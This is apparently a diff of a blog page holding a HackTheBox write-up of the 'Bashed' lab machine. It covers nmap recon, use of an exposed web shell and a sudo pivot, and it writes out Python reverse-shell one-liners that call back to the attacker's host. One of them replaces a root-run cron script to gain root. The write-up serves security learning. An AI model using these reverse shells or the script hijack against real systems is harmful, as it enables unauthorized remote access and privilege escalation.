@@ -1,214 +1,30 @@
-<!DOCTYPE html>
-<html lang="en">
-    <head>
-        <meta charset="utf-8">
-        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-        <title>HackTheBox Writeup: Bashed | Securing The Net</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="robots" content="noodp" />
-<meta name="Description" content="Tech ramblings from the desert">
-<link rel="prev" href="https://securingthe.net/2018/03/infosec-is-bigger-than-pentesting/" />
-<link rel="next" href="https://securingthe.net/2019/02/starting-my-oscp-journey/" />
-<link rel="canonical" href="https://securingthe.net/2018/05/hackthebox-bashed/" />
-<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
-<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-<link rel="manifest" href="/site.webmanifest">
-<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
-<meta name="msapplication-TileColor" content="#da532c">
-<meta name="theme-color" content="#ffffff">
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="HackTheBox Writeup: Bashed"/>
-<meta name="twitter:description" content="As a career blue teamer I feel it&rsquo;s important to understand the tools, techniques, and thought processes of an attacker. The best way to learn is by doing, and one of my favorite ways to practice is HackTheBox.
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>HackTheBox Writeup: Bashed | Securing The Net</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta name=Description content="Tech ramblings from the desert"><link rel=prev href=https://securingthe.net/2018/03/infosec-is-bigger-than-pentesting/><link rel=next href=https://securingthe.net/2019/02/starting-my-oscp-journey/><link rel=canonical href=https://securingthe.net/2018/05/hackthebox-bashed/><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><meta name=twitter:card content="summary"><meta name=twitter:title content="HackTheBox Writeup: Bashed"><meta name=twitter:description content="As a career blue teamer I feel it&rsquo;s important to understand the tools, techniques, and thought processes of an attacker. The best way to learn is by doing, and one of my favorite ways to practice is HackTheBox.
 The machine named Bashed was recently retired so walkthroughs for it have been popping up everywhere. This one is mine.
-Recon As usual with a HackTheBox target system, all you have at the onset is a name and IP address."/>
-<script type="application/ld+json">
-    {
-    "@context": "http://schema.org",
-    "@type": "BlogPosting",
-    "headline": "HackTheBox Writeup: Bashed",
-    "mainEntityOfPage": {
-        "@type": "WebPage",
-        "@id": "https:\/\/securingthe.net\/2018\/05\/hackthebox-bashed\/"
-    },
-    
-        "image": {
-            "@type": "ImageObject",
-            "url": "https:\/\/securingthe.net\/cover.png",
-            "width":  800 ,
-            "height":  600 
-        },
-    
-    "genre": "posts",
-    
-        "keywords": "Linux, HackTheBox",
-    
-    "wordcount":  1400 ,
-    "url": "https:\/\/securingthe.net\/2018\/05\/hackthebox-bashed\/",
-    
-        "datePublished": "2018-05-05T02:47:50\x2b00:00",
-    
-    
-        "dateModified": "2020-02-01T16:19:02-07:00",
-    
-    
-        "license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.",
-    
-    
-        "publisher": {
-            "@type": "Organization",
-            "name": "AJ McQuay",
-            "logo": {
-            "@type": "ImageObject",
-            "url": "https:\/\/securingthe.net\/logo.png",
-            "width":  127 ,
-            "height":  40 
-            }
-        },
-    
-    
-    "description": ""
-    }
-    </script>
-<link rel="stylesheet" href="/css/style.min.css">
-<link rel="stylesheet" href="/css/lib/fontawesome-free/all.min.min.css">
-
-<link rel="stylesheet" href="/css/lib/animate/animate.min.min.css">
-
-
-    </head>
-    <body>
-        <script>
-            window.isDark = (window.localStorage && window.localStorage.getItem('theme')) === 'dark';
-            window.isDark && document.body.classList.add('dark-theme');
-        </script>
-        <div class="wrapper">
-            <nav class="navbar">
-    <div class="navbar-container">
-        <div class="navbar-header animated bounceIn">
-            <a href="https://securingthe.net/">Securing The Net</a>
-        </div>
-        <div class="navbar-menu">
-            
-            
-                <a class="menu-item" href="https://securingthe.net/posts" title="">Posts</a>
-            
-                <a class="menu-item" href="https://securingthe.net/tags" title="">Tags</a>
-            
-                <a class="menu-item" href="https://securingthe.net/categories" title="">Categories</a>
-            
-                <a class="menu-item" href="https://securingthe.net/posts/about/" title="">About</a>
-            
-                <a class="menu-item" href="https://securingthe.net" title=""><i class="fas fa-language fa-fw"></i></a>
-            
-            <a href="javascript:void(0);" class="theme-switch"><i class="fas fa-adjust fa-rotate-180 fa-fw" title="Switch Theme"></i></a>
-        </div>
-    </div>
-</nav>
-<nav class="navbar-mobile">
-     <div class="navbar-container">
-        <div class="navbar-header">
-            <div class="navbar-header-title animated bounceIn">
-                <a href="https://securingthe.net/">Securing The Net</a>
-            </div>
-            <div class="menu-toggle" id="menu-toggle">
-                <span></span><span></span><span></span>
-            </div>
-        </div>
-        <div class="navbar-menu" id="mobile-menu">
-            
-            
-                <a class="menu-item" href="https://securingthe.net/posts" title="">Posts</a>
-            
-                <a class="menu-item" href="https://securingthe.net/tags" title="">Tags</a>
-            
-                <a class="menu-item" href="https://securingthe.net/categories" title="">Categories</a>
-            
-                <a class="menu-item" href="https://securingthe.net/posts/about/" title="">About</a>
-            
-                <a class="menu-item" href="https://securingthe.net" title=""><i class="fas fa-language fa-fw"></i></a>
-            
-            <a href="javascript:void(0);" class="theme-switch"><i class="fas fa-adjust fa-rotate-180 fa-fw"></i></a>
-        </div>
-    </div>
-</nav><main class="main">
-                <div class="container">
-                    
-    
-    
-    
-       
-    
-
-    <article class="post-warp">
-        <h1 class="post-title animated flipInX">HackTheBox Writeup: Bashed</h1>
-
-        <div class="post-meta">
-            <div class="post-meta-main">
-                <a class="author" href="https://securingthe.net/" rel="author"><i class="fas fa-user-circle fa-fw"></i>AJ McQuay&nbsp;</a>
-                <span class="post-category">
-                        included in
-                        <i class="far fa-folder fa-fw"></i><a href="https://securingthe.net/categories/linux/">Linux</a>
-                            <i class="far fa-folder fa-fw"></i><a href="https://securingthe.net/categories/hackthebox/">HackTheBox</a>
-                            
-                    </span>
-            </div>
-            <div class="post-meta-other">
-                <i class="far fa-calendar-alt fa-fw"></i><time datetime=2018-05-05>2018-05-05</time>&nbsp;
-                <i class="fas fa-pencil-alt fa-fw"></i>about 1400 words&nbsp;
-                <i class="far fa-clock fa-fw"></i>7 min&nbsp;</div>
-        </div>
-
-        
-
-        
-
-        <div class="post-content">
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            <p>As a career blue teamer I feel it&rsquo;s important to understand the tools, techniques, and thought processes of an attacker.  The best way to learn is by doing, and one of my favorite ways to practice is <a href="https://hackthebox.eu">HackTheBox</a>.</p>
-<p>The machine named <em>Bashed</em> was recently retired so walkthroughs for it have been popping up everywhere. This one is mine.</p>
-<a class="post-dummy-target" id="recon"></a><h1>Recon</h1>
-<p>As usual with a HackTheBox target system, all you have at the onset is a name and IP address. My starting point is usually an nmap scan against the target machine&rsquo;s IP.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">nmap -sC -sV -oA nmap 10.10.10.68
+Recon As usual with a HackTheBox target system, all you have at the onset is a name and IP address."><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"HackTheBox Writeup: Bashed","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/securingthe.net\/2018\/05\/hackthebox-bashed\/"},"image":{"@type":"ImageObject","url":"https:\/\/securingthe.net\/cover.png","width":800,"height":600},"genre":"posts","keywords":"Linux, HackTheBox","wordcount":1400,"url":"https:\/\/securingthe.net\/2018\/05\/hackthebox-bashed\/","datePublished":"2018-05-05T02:47:50\x2b00:00","dateModified":"2020-02-01T16:19:02-07:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"AJ McQuay","logo":{"@type":"ImageObject","url":"https:\/\/securingthe.net\/logo.png","width":127,"height":40}},"description":""}</script><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/css/lib/fontawesome-free/all.min.min.css><link rel=stylesheet href=/css/lib/animate/animate.min.min.css></head><body><script>window.isDark=(window.localStorage&&window.localStorage.getItem('theme'))==='dark';window.isDark&&document.body.classList.add('dark-theme');</script><div class=wrapper><nav class=navbar><div class=navbar-container><div class="navbar-header animated bounceIn"><a href=https://securingthe.net/>Securing The Net</a></div><div class=navbar-menu><a class=menu-item href=https://securingthe.net/posts>Posts</a>
+<a class=menu-item href=https://securingthe.net/tags>Tags</a>
+<a class=menu-item href=https://securingthe.net/categories>Categories</a>
+<a class=menu-item href=https://securingthe.net/posts/about/>About</a>
+<a class=menu-item href=https://securingthe.net><i class="fas fa-language fa-fw"></i></a><a href=javascript:void(0); class=theme-switch><i class="fas fa-adjust fa-rotate-180 fa-fw" title="Switch Theme"></i></a></div></div></nav><nav class=navbar-mobile><div class=navbar-container><div class=navbar-header><div class="navbar-header-title animated bounceIn"><a href=https://securingthe.net/>Securing The Net</a></div><div class=menu-toggle id=menu-toggle><span></span><span></span><span></span></div></div><div class=navbar-menu id=mobile-menu><a class=menu-item href=https://securingthe.net/posts>Posts</a>
+<a class=menu-item href=https://securingthe.net/tags>Tags</a>
+<a class=menu-item href=https://securingthe.net/categories>Categories</a>
+<a class=menu-item href=https://securingthe.net/posts/about/>About</a>
+<a class=menu-item href=https://securingthe.net><i class="fas fa-language fa-fw"></i></a><a href=javascript:void(0); class=theme-switch><i class="fas fa-adjust fa-rotate-180 fa-fw"></i></a></div></div></nav><main class=main><div class=container><article class=post-warp><h1 class="post-title animated flipInX">HackTheBox Writeup: Bashed</h1><div class=post-meta><div class=post-meta-main><a class=author href=https://securingthe.net/ rel=author><i class="fas fa-user-circle fa-fw"></i>AJ McQuay&nbsp;</a>
+<span class=post-category>included in
+<i class="far fa-folder fa-fw"></i><a href=https://securingthe.net/categories/linux/>Linux</a>
+<i class="far fa-folder fa-fw"></i><a href=https://securingthe.net/categories/hackthebox/>HackTheBox</a></span></div><div class=post-meta-other><i class="far fa-calendar-alt fa-fw"></i><time datetime=2018-05-05>2018-05-05</time>&nbsp;
+<i class="fas fa-pencil-alt fa-fw"></i>about 1400 words&nbsp;
+<i class="far fa-clock fa-fw"></i>7 min&nbsp;</div></div><div class=post-content><p>As a career blue teamer I feel it&rsquo;s important to understand the tools, techniques, and thought processes of an attacker. The best way to learn is by doing, and one of my favorite ways to practice is <a href=https://hackthebox.eu>HackTheBox</a>.</p><p>The machine named <em>Bashed</em> was recently retired so walkthroughs for it have been popping up everywhere. This one is mine.</p><a class=post-dummy-target id=recon></a><h1>Recon</h1><p>As usual with a HackTheBox target system, all you have at the onset is a name and IP address. My starting point is usually an nmap scan against the target machine&rsquo;s IP.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>nmap -sC -sV -oA nmap 10.10.10.68
 Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:05 EST
 Nmap scan report for 10.10.10.68
 Host is up (0.17s latency).
@@ -219,29 +35,22 @@ PORT   STATE SERVICE VERSION
 |_http-title: Arrexel&#39;s Development Site
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 16.71 seconds
-</code></pre></td></tr></table>
-</div>
-</div><p>Ok, TCP 80 / HTTP is listening.  There are several options for investigating further, but before opening a web browser I continued with nmap and ran the http-enum script.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">nmap --script http-enum 10.10.10.68
+</code></pre></td></tr></table></div></div><p>Ok, TCP 80 / HTTP is listening. There are several options for investigating further, but before opening a web browser I continued with nmap and ran the http-enum script.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>nmap --script http-enum 10.10.10.68
 Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:07 EST
 Nmap scan report for 10.10.10.68
 Host is up (0.17s latency).
@@ -256,116 +65,60 @@ PORT   STATE SERVICE
 |   /php/: Potentially interesting directory w/ listing on &#39;apache/2.4.18 (ubuntu)&#39;
 |_  /uploads/: Potentially interesting folder
 Nmap done: 1 IP address (1 host up) scanned in 46.16 seconds
-</code></pre></td></tr></table>
-</div>
-</div><p>The /dev directory contains a couple of scripts.  Visiting http://10.10.10.68/dev/phpbash.php in a browser presented me with a web shell (!).  I&rsquo;m able to navigate the file structure and read the contents of /home.  Getting user.txt is a simple exercise at this point.</p>
-<p><img src="/content/images/2018/05/bashed_user.png" alt="bashed_user"></p>
-<p><strong>user = owned</strong></p>
-<a class="post-dummy-target" id="gaining-a-foothold"></a><h1>Gaining a Foothold</h1>
-<p>I need to get a &ldquo;real&rdquo; shell on the box to go any further. I choose one of my favorite reverse shell one-liners and see if it will work from the PHP web shell.</p>
-<p>First, I&rsquo;ll need a listener on my local attacker machine:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">nc -v -n -l -p 4444
-</code></pre></td></tr></table>
-</div>
-</div><p>Now I drop this python script directly in the web shell.  The ampersand (&amp;) at the end just backgrounds the process.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;my HTB IP address&gt;&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; &amp;
-</code></pre></td></tr></table>
-</div>
-</div><p>Note that the field &ldquo;my HTB IP address&rdquo; would be the 10.10.x.x IP assigned to the VPN interface on my machine (usually tap0 on Kali Linux) when I&rsquo;m connected to the HTB environment, and the port number (4444) is the same one I used to start the netcat listener in the previous step.</p>
-<p><img src="/content/images/2018/05/bashed_revshell1.png" alt="bashed_revshell1"></p>
-<p>Now I have a reverse shell on the target system, but it&rsquo;s still limited. I try using python again to escape to a bash shell.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
-</code></pre></td></tr></table>
-</div>
-</div><p><img src="/content/images/2018/05/bashed_revshell2.png" alt="bashed_revshell2"></p>
-<p>Great, now I&rsquo;m at a more typical shell as user www-data.  Time to enumerate.</p>
-<a class="post-dummy-target" id="enumeration"></a><h1>Enumeration</h1>
-<p>I checked many many things, but looking at sudo capabilities turned up some useful information.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">www-data@bashed:/var/www/html/dev$ sudo -l
+</code></pre></td></tr></table></div></div><p>The /dev directory contains a couple of scripts. Visiting http://10.10.10.68/dev/phpbash.php in a browser presented me with a web shell (!). I&rsquo;m able to navigate the file structure and read the contents of /home. Getting user.txt is a simple exercise at this point.</p><p><img src=/content/images/2018/05/bashed_user.png alt=bashed_user></p><p><strong>user = owned</strong></p><a class=post-dummy-target id=gaining-a-foothold></a><h1>Gaining a Foothold</h1><p>I need to get a &ldquo;real&rdquo; shell on the box to go any further. I choose one of my favorite reverse shell one-liners and see if it will work from the PHP web shell.</p><p>First, I&rsquo;ll need a listener on my local attacker machine:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>nc -v -n -l -p 4444
+</code></pre></td></tr></table></div></div><p>Now I drop this python script directly in the web shell. The ampersand (&) at the end just backgrounds the process.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;my HTB IP address&gt;&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; &amp;
+</code></pre></td></tr></table></div></div><p>Note that the field &ldquo;my HTB IP address&rdquo; would be the 10.10.x.x IP assigned to the VPN interface on my machine (usually tap0 on Kali Linux) when I&rsquo;m connected to the HTB environment, and the port number (4444) is the same one I used to start the netcat listener in the previous step.</p><p><img src=/content/images/2018/05/bashed_revshell1.png alt=bashed_revshell1></p><p>Now I have a reverse shell on the target system, but it&rsquo;s still limited. I try using python again to escape to a bash shell.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+</code></pre></td></tr></table></div></div><p><img src=/content/images/2018/05/bashed_revshell2.png alt=bashed_revshell2></p><p>Great, now I&rsquo;m at a more typical shell as user www-data. Time to enumerate.</p><a class=post-dummy-target id=enumeration></a><h1>Enumeration</h1><p>I checked many many things, but looking at sudo capabilities turned up some useful information.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>www-data@bashed:/var/www/html/dev$ sudo -l
 sudo -l
 Matching Defaults entries for www-data on bashed:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 User www-data may run the following commands on bashed:
     (scriptmanager : scriptmanager) NOPASSWD: ALL
-</code></pre></td></tr></table>
-</div>
-</div><p>So, my current user (www-data) can run ALL commands as user scriptmanager with no password? I decide to try becoming scriptmanager.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">www-data@bashed:/var/www/html/dev$ sudo -i -u scriptmanager
+</code></pre></td></tr></table></div></div><p>So, my current user (www-data) can run ALL commands as user scriptmanager with no password? I decide to try becoming scriptmanager.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>www-data@bashed:/var/www/html/dev$ sudo -i -u scriptmanager
 sudo -i -u scriptmanager
 scriptmanager@bashed:~$
-</code></pre></td></tr></table>
-</div>
-</div><p>From the <a href="https://www.sudo.ws/man/1.8.3/sudo.man.html">sudo man page</a>:</p>
-<blockquote>
-<p>-i [command]
-The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell. This means that login-specific resource files such as .profile or .login will be read by the shell. If a command is specified, it is passed to the shell for execution via the shell&rsquo;s -c option. ==If no command is specified, an interactive shell is executed.== sudo attempts to change to that user&rsquo;s home directory before running the shell. The security policy shall initialize the environment to a minimal set of variables, similar to what is present when a user logs in. The Command Environment section in the sudoers(5) manual documents how the -i option affects the environment in which a command is run when the sudoers policy is in use.</p>
-</blockquote>
-<p>Bingo, now I&rsquo;m scriptmanager.  More enumeration.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">scriptmanager@bashed:/var/www/html/dev$ ls -l /
+</code></pre></td></tr></table></div></div><p>From the <a href=https://www.sudo.ws/man/1.8.3/sudo.man.html>sudo man page</a>:</p><blockquote><p>-i [command]
+The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell. This means that login-specific resource files such as .profile or .login will be read by the shell. If a command is specified, it is passed to the shell for execution via the shell&rsquo;s -c option. ==If no command is specified, an interactive shell is executed.== sudo attempts to change to that user&rsquo;s home directory before running the shell. The security policy shall initialize the environment to a minimal set of variables, similar to what is present when a user logs in. The Command Environment section in the sudoers(5) manual documents how the -i option affects the environment in which a command is run when the sudoers policy is in use.</p></blockquote><p>Bingo, now I&rsquo;m scriptmanager. More enumeration.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>scriptmanager@bashed:/var/www/html/dev$ ls -l /
 ls -l /
 total 80
 drwxr-xr-x   2 root          root           4096 Dec  4 11:22 bin
@@ -391,266 +144,25 @@ drwxrwxrwt  10 root          root           4096 Jan 12 21:07 tmp
 drwxr-xr-x  10 root          root           4096 Dec  4 11:13 usr
 drwxr-xr-x  12 root          root           4096 Dec  4 11:20 var
 lrwxrwxrwx   1 root          root             29 Dec  4 11:14 vmlinuz -&gt; boot/vmlinuz-4.4.0-62-generic
-</code></pre></td></tr></table>
-</div>
-</div><p>Strange, <code>scripts</code> isn&rsquo;t a typical top-level directory and it&rsquo;s owned by scriptmanager. I move into the directory and investigate further.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">scriptmanager@bashed:/scripts$ ls -al
+</code></pre></td></tr></table></div></div><p>Strange, <code>scripts</code> isn&rsquo;t a typical top-level directory and it&rsquo;s owned by scriptmanager. I move into the directory and investigate further.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>scriptmanager@bashed:/scripts$ ls -al
 ls -al
 total 16
 drwxrwxr--  2 scriptmanager scriptmanager 4096 Apr 20 08:14 .
 drwxr-xr-x 23 root          root          4096 Dec  4 13:02 ..
 -rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4 17:03 test.py
 -rw-r--r--  1 root          root            12 Apr 20 08:18 test.txt
-</code></pre></td></tr></table>
-</div>
-</div><p>Examining these two files leads me to believe that <code>test.txt</code> containts output from the <code>test.py</code> script.  However,<code>test.txt</code> is owned by root while the directory it resides in and the <code>test.py</code> script that generates it are owned by scriptmanager.</p>
-<p>This implies that root is executing the script as itself, so the output is written with root ownership. If I can replace <code>test.py</code> with my own malicious version I can do something on the target machine with root privileges. Reverse shell time!</p>
-<a class="post-dummy-target" id="privilege-escalation"></a><h1>Privilege Escalation</h1>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">scriptmanager@bashed:/scripts$ mv test.py old-test.py
+</code></pre></td></tr></table></div></div><p>Examining these two files leads me to believe that <code>test.txt</code> containts output from the <code>test.py</code> script. However,<code>test.txt</code> is owned by root while the directory it resides in and the <code>test.py</code> script that generates it are owned by scriptmanager.</p><p>This implies that root is executing the script as itself, so the output is written with root ownership. If I can replace <code>test.py</code> with my own malicious version I can do something on the target machine with root privileges. Reverse shell time!</p><a class=post-dummy-target id=privilege-escalation></a><h1>Privilege Escalation</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>scriptmanager@bashed:/scripts$ mv test.py old-test.py
 scriptmanager@bashed:/scripts$ echo &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;my HTB IP address&gt;&#34;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; &gt; test.py
-</code></pre></td></tr></table>
-</div>
-</div><p>Here I moved/renamed the existing <code>test.py</code> and created my own with the reverse shell code. This isn&rsquo;t necessary, you could just add the reverse shell bits to the end of the existing file.</p>
-<p>Again note the &ldquo;my HTB IP address field&rdquo; and port number. I want a second reverse shell that&rsquo;s separate from the one I&rsquo;m currently working in, so I selected a new port (5555).</p>
-<p>I&rsquo;m not exactly sure how or when root executes the <code>test.py</code> script.  Given the autonomous nature of these HTB systems I assume it&rsquo;s just a cron job. I start a netcat listener on this new port on my local attacker machine and wait.</p>
-<p>After a few minutes&hellip;</p>
-<p><img src="/content/images/2018/05/94582eeb-e301-49ba-9bf2-64769b24438c.png" alt="94582eeb-e301-49ba-9bf2-64769b24438c"></p>
-<p><strong>root = owned</strong></p>
-<a class="post-dummy-target" id="conclusion"></a><h1>Conclusion</h1>
